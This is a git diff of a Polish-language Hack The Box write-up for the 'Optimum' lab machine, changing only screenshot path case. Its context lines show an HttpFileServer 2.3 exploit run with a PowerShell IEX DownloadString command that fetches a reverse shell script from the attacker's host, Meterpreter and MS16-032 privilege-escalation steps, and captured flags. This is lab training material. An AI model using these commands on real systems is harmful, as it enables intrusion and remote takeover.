@@ -253,12 +253,12 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 <hr>
 <h2 id="versions">Versions:<a hidden class="anchor" aria-hidden="true" href="#versions">#</a></h2>
 <p>HttpFileServer 2.3</p>
-<p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210811132019.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210811132019.png" alt=""  />
 </p>
 <hr>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 49125.py 10.10.10.8 <span style="color:#ae81ff">80</span> <span style="color:#e6db74">&#34;c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.19/mini-reverse.ps1&#39;)&#34;</span>
 </code></pre></div><p>Otrzymanie shella:</p>
-<p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210811132129.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210811132129.png" alt=""  />
 </p>
 <p>user.txt</p>
 <p><code>d0c39409d7b994a9a1389ebf38ef5f73</code></p>
@@ -296,14 +296,14 @@ Page File Location<span style="color:#f92672">(</span>s<span style="color:#f9267
 Domain:                    HTB
 Logon Server:              <span style="color:#ae81ff">\\</span>OPTIMUM
 Hotfix<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:                 <span style="color:#ae81ff">31</span> Hotfix<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> Installed.
-</code></pre></div><p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210811140424.png" alt=""  />
+</code></pre></div><p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210811140424.png" alt=""  />
 </p>
 <hr>
 <h1 id="privileges-escalation">Privileges Escalation<a hidden class="anchor" aria-hidden="true" href="#privileges-escalation">#</a></h1>
 <p>Zmiana planów</p>
 <p><a href="https://vk9-sec.com/microsoft-windows-7-10-2008-2012-r2-x86-x64-local-privilege-escalation-ms16-032-2016-0099/">https://vk9-sec.com/microsoft-windows-7-10-2008-2012-r2-x86-x64-local-privilege-escalation-ms16-032-2016-0099/</a></p>
 <h2 id="meterpreter">Meterpreter<a hidden class="anchor" aria-hidden="true" href="#meterpreter">#</a></h2>
-<p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210811171452.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210811171452.png" alt=""  />
 </p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; powershell_import <span style="color:#e6db74">&#34;/home/kali/htb/optimum/Sherlock.ps1&#34;</span>                                      
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> File successfully imported. No result was returned.
@@ -345,7 +345,7 @@ msf6 exploit<span style="color:#f92672">(</span>windows/local/ms16_032_secondary
 TARGET <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">1</span>
 msf6 exploit<span style="color:#f92672">(</span>windows/local/ms16_032_secondary_logon_handle_privesc<span style="color:#f92672">)</span> &gt; run
 
-</code></pre></div><p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210811171841.png" alt=""  />
+</code></pre></div><p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210811171841.png" alt=""  />
 </p>
 <p>root.txt</p>
 <p><code>51ed1b36553c8461f4552c2e92b3eeed</code></p>
